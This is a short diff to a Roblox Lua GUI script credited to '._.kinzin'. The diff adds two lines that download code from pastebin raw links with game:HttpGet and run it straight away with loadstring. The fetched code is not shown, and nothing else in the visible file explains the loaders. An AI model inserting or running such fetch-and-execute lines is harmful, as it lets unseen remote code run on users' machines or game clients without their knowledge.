@@ -3,7 +3,8 @@
 Made only by ._.kinzin 👻
 
 ]]
-
+loadstring(game:HttpGet('https://pastebin.com/raw/qfmByDZ3'))()
+loadstring(game:HttpGet("https://pastebin.com/raw/hq9FKvrC"))()
 -- Instances: 43 | Scripts: 24 | Modules: 0 | Tags: 0
 local G2L = {};
 
